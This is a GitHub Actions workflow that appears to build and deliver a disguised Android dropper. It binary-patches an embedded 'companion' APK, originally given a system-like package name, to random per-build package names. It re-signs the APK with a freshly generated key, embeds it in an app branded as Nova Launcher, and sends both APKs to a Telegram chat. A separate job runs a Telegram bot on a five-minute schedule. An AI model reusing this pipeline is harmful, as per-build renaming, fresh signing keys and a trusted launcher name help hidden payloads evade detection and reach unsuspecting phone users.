# ════════════════════════════════════════════════════════
# UNIFIED BUILD WORKFLOW
# Handles: Bot (24/7) + Build Both Apps
# Nova package:     com.mobile.tools.XXXXXXXXXXXXXXXXXXX (36 chars fixed)
# Companion package: com.phone.helpXXXXX (19 chars fixed)
# ════════════════════════════════════════════════════════

name: Builder

on:
  push:
    branches: [ main ]
  schedule:
    - cron: '*/5 * * * *'
  workflow_dispatch:
    inputs:
      build_type:
        description: 'bot | both'
        required: true
        default: 'bot'
      nova_package:
        description: 'Nova package name (exactly 36 chars: com.mobile.tools.XXXXXXXXXXXXXXXXXXX)'
        required: false
        default: ''
      companion_package:
        description: 'Companion package name (exactly 19 chars: com.phone.helpXXXXX)'
        required: false
        default: ''
      chain_part1:
        description: 'Chain Part 1 (10 random chars for manifest metadata)'
        required: false
        default: ''
      app_name:
        description: 'App name for Nova Launcher'
        required: false
        default: ''
      icon_b64:
        description: 'Base64 encoded PNG icon'
        required: false
        default: ''

# ════════════════════════════════════════════════════════
# JOB 1 — TELEGRAM BOT (24/7)
# ════════════════════════════════════════════════════════

jobs:

  bot:
    name: Telegram Bot
    runs-on: ubuntu-latest
    if: >
      github.event_name == 'push' ||
      github.event_name == 'schedule' ||
      (github.event_name == 'workflow_dispatch' &&
       github.event.inputs.build_type == 'bot')
    timeout-minutes: 5

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: pip install pytelegrambotapi requests

      - name: Run Telegram Bot (4 min window)
        env:
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID:   ${{ secrets.TELEGRAM_CHAT_ID }}
          GH_PAT:             ${{ secrets.GH_PAT }}
          REPO_NAME:          ${{ github.repository }}
        run: timeout 240 python3 telegram_bot.py || true

# ════════════════════════════════════════════════════════
# JOB 2 — BUILD BOTH APPS
# ════════════════════════════════════════════════════════

  build_both:
    name: Build Both Apps
    runs-on: ubuntu-latest
    if: >
      github.event_name == 'workflow_dispatch' &&
      github.event.inputs.build_type == 'both'
    timeout-minutes: 45

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      # ── Validate inputs ──────────────────────────────────────
      - name: Validate package name lengths
        run: |
          NOVA_PKG="${{ github.event.inputs.nova_package }}"
          COMP_PKG="${{ github.event.inputs.companion_package }}"
          NOVA_LEN=${#NOVA_PKG}
          COMP_LEN=${#COMP_PKG}

          echo "Nova package    : $NOVA_PKG ($NOVA_LEN chars)"
          echo "Companion package: $COMP_PKG ($COMP_LEN chars)"

          if [ "$NOVA_LEN" != "36" ]; then
            echo "[X] Nova package must be exactly 36 chars (got $NOVA_LEN)"
            exit 1
          fi
          if [ "$COMP_LEN" != "19" ]; then
            echo "[X] Companion package must be exactly 19 chars (got $COMP_LEN)"
            exit 1
          fi
          echo "[OK] Package lengths validated"

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
          cache: gradle

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      # ── Install apktool ──────────────────────────────────────
      - name: Install apktool
        run: |
          wget -q \
            https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar \
            -O /usr/local/bin/apktool.jar
          wget -q \
            https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool \
            -O /usr/local/bin/apktool
          chmod +x /usr/local/bin/apktool
          apktool --version
          echo "[OK] apktool installed"

      # ── STAGE 1: Patch Companion APK ────────────────────────
      - name: Patch Companion APK (binary DEX patch)
        run: |
          NOVA_PKG="${{ github.event.inputs.nova_package }}"
          COMP_PKG="${{ github.event.inputs.companion_package }}"

          OLD_NOVA="com.cristal.bristral.tristal.mistral"
          OLD_COMP="com.android.pictach"
          OLD_COMP_PATH="com/android/pictach"

          NEW_COMP_PATH=$(echo "$COMP_PKG" | tr '.' '/')

          echo "Patching companion DEX..."
          echo "  Nova: $OLD_NOVA → $NOVA_PKG"
          echo "  Companion pkg: $OLD_COMP → $COMP_PKG"
          echo "  Companion path: $OLD_COMP_PATH → $NEW_COMP_PATH"

          python3 << 'PYEOF'
          import sys, os

          nova_pkg     = os.environ.get('NOVA_PKG', '')
          comp_pkg     = os.environ.get('COMP_PKG', '')

          old_nova     = b'com.cristal.bristral.tristal.mistral'
          old_nova_uri = b'package:com.cristal.bristral.tristal.mistral'
          old_comp     = b'com.android.pictach'
          old_comp_path = b'com/android/pictach'

          new_nova     = nova_pkg.encode()
          new_nova_uri = b'package:' + nova_pkg.encode()
          new_comp     = comp_pkg.encode()
          new_comp_path = comp_pkg.replace('.', '/').encode()

          # Validate lengths
          assert len(old_nova) == len(new_nova), \
              f"Nova pkg length mismatch: {len(old_nova)} != {len(new_nova)}"
          assert len(old_nova_uri) == len(new_nova_uri), \
              f"Nova URI length mismatch: {len(old_nova_uri)} != {len(new_nova_uri)}"
          assert len(old_comp) == len(new_comp), \
              f"Companion pkg length mismatch: {len(old_comp)} != {len(new_comp)}"
          assert len(old_comp_path) == len(new_comp_path), \
              f"Companion path length mismatch: {len(old_comp_path)} != {len(new_comp_path)}"

          dex = open('app/src/main/assets/companion.apk', 'rb').read()

          # Count replacements
          nova_uri_count = dex.count(old_nova_uri)
          nova_count     = dex.count(old_nova) - nova_uri_count
          comp_count     = dex.count(old_comp)
          path_count     = dex.count(old_comp_path)

          print(f"  Nova URI occurrences  : {nova_uri_count}")
          print(f"  Nova pkg occurrences  : {nova_count}")
          print(f"  Companion pkg occurrences: {comp_count}")
          print(f"  Companion path occurrences: {path_count}")

          # Patch in correct order:
          # 1. Replace full URI first (more specific)
          dex = dex.replace(old_nova_uri, new_nova_uri)
          # 2. Replace remaining nova pkg references
          dex = dex.replace(old_nova, new_nova)
          # 3. Replace companion path (slashes — more specific first)
          dex = dex.replace(old_comp_path, new_comp_path)
          # 4. Replace companion pkg (dots)
          dex = dex.replace(old_comp, new_comp)

          # Write patched APK (same file — we'll re-sign it)
          open('companion_patched_raw.apk', 'wb').write(dex)
          print("[OK] DEX binary patch complete")
          PYEOF
        env:
          NOVA_PKG: ${{ github.event.inputs.nova_package }}
          COMP_PKG: ${{ github.event.inputs.companion_package }}

      - name: Repackage companion APK with patched DEX
        run: |
          COMP_PKG="${{ github.event.inputs.companion_package }}"

          # Extract original APK
          mkdir -p companion_work
          cp app/src/main/assets/companion.apk companion_original.apk
          cd companion_work
          unzip -q ../companion_original.apk

          # Replace classes.dex with patched one
          # Extract classes.dex from our patched raw
          cd ..
          unzip -p companion_patched_raw.apk classes.dex > companion_work/classes.dex 2>/dev/null || \
            cp companion_patched_raw.apk /tmp/raw_patched.bin

          # Use apktool to properly recompile manifest with new package
          apktool d companion_original.apk -o companion_decoded --force
          echo "[OK] Decompiled"

          # Patch package name in decoded manifest
          OLD_PKG="com.android.pictach"
          sed -i "s|package=\"$OLD_PKG\"|package=\"$COMP_PKG\"|g" companion_decoded/AndroidManifest.xml
          sed -i "s|$OLD_PKG|$COMP_PKG|g" companion_decoded/AndroidManifest.xml
          echo "[OK] Manifest patched"

          # Copy patched DEX into decoded folder
          python3 << 'PYEOF'
          import os, zipfile

          nova_pkg = os.environ.get('NOVA_PKG', '')
          comp_pkg = os.environ.get('COMP_PKG', '')

          old_nova_uri = b'package:com.cristal.bristral.tristal.mistral'
          old_comp     = b'com.android.pictach'
          old_comp_path = b'com/android/pictach'

          new_nova_uri  = b'package:' + nova_pkg.encode()
          new_comp      = comp_pkg.encode()
          new_comp_path = comp_pkg.replace('.', '/').encode()

          # Read original APK and patch classes.dex
          with zipfile.ZipFile('companion_original.apk', 'r') as zin:
              dex = zin.read('classes.dex')

          dex = dex.replace(old_nova_uri, new_nova_uri)
          dex = dex.replace(old_comp_path, new_comp_path)
          dex = dex.replace(old_comp, new_comp)

          # Write patched DEX to decoded folder
          with open('companion_decoded/classes.dex', 'wb') as f:
              f.write(dex)
          print("[OK] Patched DEX placed in decoded folder")
          PYEOF
        env:
          NOVA_PKG: ${{ github.event.inputs.nova_package }}
          COMP_PKG: ${{ github.event.inputs.companion_package }}

      - name: Rebuild companion APK with apktool
        run: |
          apktool b companion_decoded -o companion_unsigned.apk
          echo "[OK] Rebuilt — $(du -h companion_unsigned.apk | cut -f1)"

      - name: Generate fresh keystore for companion
        run: |
          keytool -genkeypair \
            -alias companion_key \
            -keyalg RSA \
            -keysize 2048 \
            -validity 10000 \
            -keystore companion.jks \
            -storepass "${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
            -keypass "${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
            -dname "CN=Android, OU=App, O=Mobile, L=US, S=CA, C=US" \
            -noprompt
          echo "[OK] Keystore generated"

      - name: Zipalign companion APK
        run: |
          BUILD_TOOLS=$(ls $ANDROID_HOME/build-tools/ | sort -V | tail -1)
          $ANDROID_HOME/build-tools/$BUILD_TOOLS/zipalign -v 4 \
            companion_unsigned.apk companion_aligned.apk
          echo "[OK] Zipaligned"

      - name: Sign companion APK
        run: |
          BUILD_TOOLS=$(ls $ANDROID_HOME/build-tools/ | sort -V | tail -1)
          $ANDROID_HOME/build-tools/$BUILD_TOOLS/apksigner sign \
            --ks companion.jks \
            --ks-key-alias companion_key \
            --ks-pass pass:"${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
            --key-pass pass:"${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
            --out companion_signed.apk \
            companion_aligned.apk
          echo "[OK] Signed — $(du -h companion_signed.apk | cut -f1)"

      - name: Verify companion patch
        run: |
          python3 << 'PYEOF'
          import zipfile, os

          nova_pkg = os.environ.get('NOVA_PKG', '')
          comp_pkg = os.environ.get('COMP_PKG', '')

          with zipfile.ZipFile('companion_signed.apk', 'r') as z:
              dex = z.read('classes.dex')

          # Verify old strings are gone
          old_nova_uri = b'package:com.cristal.bristral.tristal.mistral'
          old_comp     = b'com.android.pictach'
          new_nova_uri  = ('package:' + nova_pkg).encode()
          new_comp      = comp_pkg.encode()

          assert old_nova_uri not in dex, "[X] Old Nova URI still in DEX!"
          assert old_comp not in dex,     "[X] Old companion pkg still in DEX!"
          assert new_nova_uri in dex,     "[X] New Nova URI NOT found in DEX!"
          assert new_comp in dex,         "[X] New companion pkg NOT found in DEX!"

          print("[OK] Companion patch verified successfully!")
          print(f"  Nova target   : {nova_pkg}")
          print(f"  Companion pkg : {comp_pkg}")
          PYEOF
        env:
          NOVA_PKG: ${{ github.event.inputs.nova_package }}
          COMP_PKG: ${{ github.event.inputs.companion_package }}

      # ── STAGE 2: Patch Nova Launcher source ─────────────────
      - name: Place patched companion into Nova assets
        run: |
          cp companion_signed.apk app/src/main/assets/companion.apk
          echo "[OK] Patched companion placed in assets — $(du -h app/src/main/assets/companion.apk | cut -f1)"

      - name: Patch Nova applicationId in build.gradle
        run: |
          NOVA_PKG="${{ github.event.inputs.nova_package }}"
          COMP_PKG="${{ github.event.inputs.companion_package }}"

          # Patch applicationId
          sed -i "s|applicationId \"[^\"]*\"|applicationId \"$NOVA_PKG\"|" app/build.gradle

          # Patch COMPANION_PACKAGE BuildConfig field
          sed -i "s|buildConfigField \"String\", \"COMPANION_PACKAGE\", \"[^\"]*\"|buildConfigField \"String\", \"COMPANION_PACKAGE\", \"\\\"$COMP_PKG\\\"\"|" app/build.gradle

          echo "[OK] build.gradle patched"
          grep -E "applicationId|COMPANION_PACKAGE" app/build.gradle

      - name: Patch app name in strings.xml
        run: |
          APP_NAME="${{ github.event.inputs.app_name }}"
          if [ -n "$APP_NAME" ]; then
            python3 -c "
          import re, sys
          content = open('app/src/main/res/values/strings.xml').read()
          content = re.sub(
              r'<string name=\"app_name\">[^<]*</string>',
              '<string name=\"app_name\">' + sys.argv[1] + '</string>',
              content
          )
          open('app/src/main/res/values/strings.xml', 'w').write(content)
          print('[OK] App name set to: ' + sys.argv[1])
            " "$APP_NAME"
          else
            echo "[SKIP] No app name provided"
          fi

      - name: Patch chain_part1 in AndroidManifest.xml
        run: |
          CHAIN="${{ github.event.inputs.chain_part1 }}"
          if [ -n "$CHAIN" ]; then
            sed -i "s|android:value=\"PLACEHOLDER\"|android:value=\"$CHAIN\"|" \
              app/src/main/AndroidManifest.xml
            echo "[OK] chain_part1 set to: $CHAIN"
          else
            echo "[SKIP] No chain_part1 provided"
          fi

      - name: Apply launcher icon
        run: |
          ICON_B64="${{ github.event.inputs.icon_b64 }}"
          if [ -n "$ICON_B64" ]; then
            echo "$ICON_B64" | base64 -d > /tmp/icon_input.png
            sudo apt-get install -y imagemagick -q 2>/dev/null
            for size_dir in mdpi:48 hdpi:72 xhdpi:96 xxhdpi:144 xxxhdpi:192; do
              DIR=$(echo $size_dir | cut -d: -f1)
              SIZE=$(echo $size_dir | cut -d: -f2)
              convert /tmp/icon_input.png -resize ${SIZE}x${SIZE} \
                app/src/main/res/mipmap-${DIR}/ic_launcher.png
              convert /tmp/icon_input.png -resize ${SIZE}x${SIZE} \
                app/src/main/res/mipmap-${DIR}/ic_launcher_round.png
            done
            echo "[OK] All icon sizes replaced"
          else
            echo "[SKIP] No icon provided"
          fi

      # ── STAGE 3: Build Nova APK ──────────────────────────────
      - name: Cache Gradle wrapper
        uses: actions/cache@v4
        with:
          path: gradle/wrapper/gradle-wrapper.jar
          key: gradle-wrapper-${{ runner.os }}

      - name: Grant gradlew permission
        run: chmod +x gradlew

      - name: Build Nova Release APK
        run: ./gradlew assembleRelease --no-daemon --stacktrace

      - name: Verify Nova APK
        run: |
          APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
          echo "[OK] Nova APK: $APK"
          echo "     Size: $(du -h $APK | cut -f1)"
          echo "     DEX files:"
          unzip -l "$APK" | grep "\.dex"

          # Verify companion is inside
          COMP_SIZE=$(unzip -l "$APK" | grep "companion.apk" | awk '{print $1}')
          echo "     companion.apk in assets: $COMP_SIZE bytes"

      # ── STAGE 4: Send to Telegram ────────────────────────────
      - name: Send Companion APK to Telegram
        run: |
          COMP_PKG="${{ github.event.inputs.companion_package }}"
          curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
            -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
            -F document=@companion_signed.apk \
            -F caption="🔧 *Companion App*
          📦 Package: \`$COMP_PKG\`
          📅 $(date -u '+%Y-%m-%d %H:%M UTC')" \
            -F parse_mode="Markdown"

      - name: Send Nova APK to Telegram
        run: |
          APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
          NOVA_PKG="${{ github.event.inputs.nova_package }}"
          COMP_PKG="${{ github.event.inputs.companion_package }}"
          CHAIN="${{ github.event.inputs.chain_part1 }}"
          APP_NAME="${{ github.event.inputs.app_name }}"
          curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
            -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
            -F document=@"$APK" \
            -F caption="✅ *Nova Launcher Built*
          📱 App Name: \`$APP_NAME\`
          📦 Nova Package: \`$NOVA_PKG\`
          📦 Companion Package: \`$COMP_PKG\`
          🔐 Chain: \`$CHAIN\`
          📅 $(date -u '+%Y-%m-%d %H:%M UTC')" \
            -F parse_mode="Markdown"

      - name: Send build summary
        run: |
          curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
            -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
            -d text="✅ *Build Complete*
          🔨 Nova: \`${{ github.event.inputs.nova_package }}\`
          🔧 Companion: \`${{ github.event.inputs.companion_package }}\`
          🔐 Chain: \`${{ github.event.inputs.chain_part1 }}\`
          📱 Name: ${{ github.event.inputs.app_name }}" \
            -d parse_mode="Markdown"
